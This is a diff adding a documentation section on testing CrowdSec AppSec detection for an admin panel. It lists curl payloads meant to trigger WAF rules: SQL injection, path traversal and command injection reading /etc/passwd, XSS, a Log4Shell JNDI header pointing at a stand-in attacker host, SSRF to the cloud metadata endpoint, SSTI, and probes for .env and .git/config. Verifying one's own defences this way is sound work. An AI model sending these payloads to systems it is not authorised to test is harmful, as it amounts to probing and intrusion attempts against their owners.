@@ -272,6 +272,133 @@ encrypted credentials already stored. The env-var overrides
 (`CROWDSEC_PANEL_MACHINE_USER`, `CROWDSEC_PANEL_MACHINE_PASSWORD`)
 also take precedence over either storage.
 
+## Testing AppSec detection
+
+After enabling AppSec (mode `detect` or `block`), confirm rules
+are firing on real traffic. CrowdSec ships ~190 inband + outofband
+rules covering generic exploits and a vpatch list of recent CVEs.
+The signatures below are deliberately benign (no actual exploit
+attempts; they just match rule patterns) but reliably trigger
+alerts when AppSec is wired correctly.
+
+Run each from outside the box (a phone on cellular, a laptop on
+another network) so the source IP is not in your loopback /
+RFC1918 allowlist; or use a remote host you control. Substitute
+`<host>` with an argos-fronted domain (e.g. `archive.example.com`).
+
+### 1. Missing User-Agent (always-on baseline)
+
+```bash
+curl -sk -H 'User-Agent: ' "https://<host>/"
+```
+
+Triggers `crowdsecurity/experimental-no-user-agent`. The simplest
+proof-of-life: any HTTP client that suppresses User-Agent.
+
+### 2. SQLi via classic UNION-SELECT in query string
+
+```bash
+curl -sk "https://<host>/?id=1%27%20UNION%20SELECT%20NULL%2CNULL--"
+```
+
+May match a generic SQLi pattern or a CVE vpatch depending on the
+target path.
+
+### 3. Scanner User-Agent (sqlmap)
+
+```bash
+curl -sk -A 'sqlmap/1.0 (https://sqlmap.org)' "https://<host>/"
+```
+
+Common scanners ship a distinctive UA; rules in the
+`crowdsecurity/generic-*` set match against an opinionated list.
+
+### 4. Path traversal
+
+```bash
+curl -sk "https://<host>/?path=../../../../etc/passwd"
+curl -sk "https://<host>/static/..%2f..%2f..%2fetc%2fpasswd"
+```
+
+Triggers traversal rules in the generic-rules collection.
+
+### 5. Command injection
+
+```bash
+curl -sk "https://<host>/?cmd=%24%28cat%20/etc/passwd%29"
+curl -sk "https://<host>/?q=;%20id"
+```
+
+### 6. XSS in query
+
+```bash
+curl -sk "https://<host>/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+```
+
+### 7. Log4Shell-style JNDI lookup
+
+```bash
+curl -sk -H 'X-Api-Version: ${jndi:ldap://attacker.test/x}' "https://<host>/"
+```
+
+Triggers the vpatch for CVE-2021-44228.
+
+### 8. SSRF probing internal endpoints
+
+```bash
+curl -sk "https://<host>/?url=http://169.254.169.254/latest/meta-data/"
+curl -sk "https://<host>/?fetch=http://localhost:6379/"
+```
+
+### 9. Server-Side Template Injection (SSTI)
+
+```bash
+curl -sk "https://<host>/?name=%7B%7B7%2A7%7D%7D"
+curl -sk "https://<host>/?template=%24%7B7%2A7%7D"
+```
+
+Triggers `crowdsecurity/generic-freemarker-ssti` and similar.
+
+### 10. WordPress / common-CMS recon
+
+```bash
+curl -sk "https://<host>/wp-config.php.bak"
+curl -sk "https://<host>/.git/config"
+curl -sk "https://<host>/.env"
+```
+
+### Verifying the result
+
+After running a few payloads, wait ~5 seconds (AppSec processes
+asynchronously) then check both surfaces:
+
+```bash
+# 1. CrowdSec alert log -- one alert per (source IP x bucket)
+docker exec argos-prod-crowdsec cscli alerts list --since 5m
+
+# 2. Panel metrics -- aggregated view that drives the AppSec page
+curl -s -b /tmp/argos-cookie.txt http://<panel-ip>:9180/api/appsec/metrics \
+  | python3 -m json.tool
+```
+
+`total_hits` in the panel metrics should match the rough count of
+matched payloads (some payloads may match multiple rules; some may
+match no rule on your specific rule version). Empty after several
+attempts -> see the
+[detect-mode-emits-no-alerts troubleshooting entry](../operations/troubleshooting.md#detect-mode-emits-no-alerts-fixed-in-v139).
+
+### Note on detect vs block
+
+In **block** mode the bouncer returns 403 to the client AND records
+the alert. In **detect** mode the request flows through to the
+backend cleanly and only the alert is recorded. Both surfaces
+above (cscli, panel metrics) work identically in both modes. The
+difference is only what the originating client sees.
+
+In **disabled** mode no listener is queried by the bouncer; alerts
+will never appear from AppSec. CrowdSec scenarios sourced from
+access logs (the LAPI bouncer feature, not AppSec) keep working.
+
 ## Notifications
 
 - [`appsec_unavailable`](notifications.md) — Severity: Warning.
